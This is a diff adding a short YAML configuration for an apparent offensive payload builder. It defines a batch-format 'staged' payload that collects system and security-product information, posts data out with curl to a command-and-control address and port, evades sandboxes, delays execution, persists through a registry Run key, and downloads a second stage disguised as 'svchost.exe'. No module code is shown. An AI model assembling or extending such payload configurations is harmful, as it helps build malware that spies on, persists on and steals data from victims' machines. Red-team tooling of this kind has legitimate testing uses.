@@ -1,0 +1,26 @@
+name: bat_persist_stager
+description: Staged payload - recon, persist, then download and execute second stage
+format: batch
+
+core:
+  - core/output
+
+collectors:
+  - collectors/sysinfo
+  - collectors/security_products
+
+exfil: exfil/curl_post
+arch: arch/staged
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/delayed_exec
+
+persist:
+  - persist/registry_run
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  PAYLOAD_NAME: "svchost.exe"
+  DELAY_SECONDS: "90"
